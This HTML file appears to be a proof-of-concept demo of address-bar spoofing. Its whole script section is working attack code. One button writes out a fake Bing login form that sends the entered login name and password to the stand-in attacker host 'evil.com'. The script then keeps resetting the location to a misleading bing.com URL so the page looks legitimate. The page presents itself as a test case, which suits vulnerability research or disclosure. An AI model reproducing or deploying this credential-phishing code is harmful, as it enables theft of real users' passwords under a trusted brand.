<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Address Bar Spoofing Demo</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
        }
        .btn {
            background-color: #4CAF50;
            color: white;
            padding: 15px 20px;
            border: none;
            cursor: pointer;
            font-size: 18px;
        }
        .btn:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <h1>Address Bar Spoofing - Fake Login Page</h1>
    <p>This page simulates a fake login form for a trusted website, while actually posting data to an attacker-controlled domain.</p>
    <input class="btn" type="button" value="Run test case" onclick="spoof();">

    <script>
        function spoof() {
            // Creating a fake login form mimicking a trusted site (e.g., Bing.com)
            document.write("<html><title>Bing.com</title>" +
                           "<form method='POST' action='//evil.com' name='form'>" +
                           "<br /><br />Login:<br/><input name='login'><br />Password:<br/>" +
                           "<input name='Password' type='password'><br/><br/>" +
                           "<input type='submit' name='Valid' value='Ok'></form></html>");

            // Manipulate the address bar (spoof the location)
            document.location = "https://bing.com:1234"; // Fake port number to mislead the user

            // Keep redirecting to the spoofed address bar every 10 seconds
            setInterval(function() {
                document.location = "https://bing.com:1234";
            }, 9800); 
        }
    </script>
</body>
</html>
